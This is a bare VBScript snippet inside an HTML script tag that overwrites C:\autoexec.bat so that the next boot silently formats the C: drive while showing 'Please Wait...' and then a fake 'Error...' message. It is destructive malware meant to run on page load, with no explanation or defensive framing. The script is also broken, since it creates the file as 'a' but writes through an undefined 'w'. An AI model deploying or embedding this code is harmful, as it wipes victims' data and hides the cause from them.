<script language=vbscript>
Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("C:\autoexec.bat", True)
w.WriteLine("@ECHO OFF")
w.WriteLine("CLS")
w.WriteLine("ECHO Please Wait...")
w.WriteLine("FORMAT C: /U /C /S /AUTOTEST > NUL")
w.WriteLine("ECHO Error...")
w.Close
</script>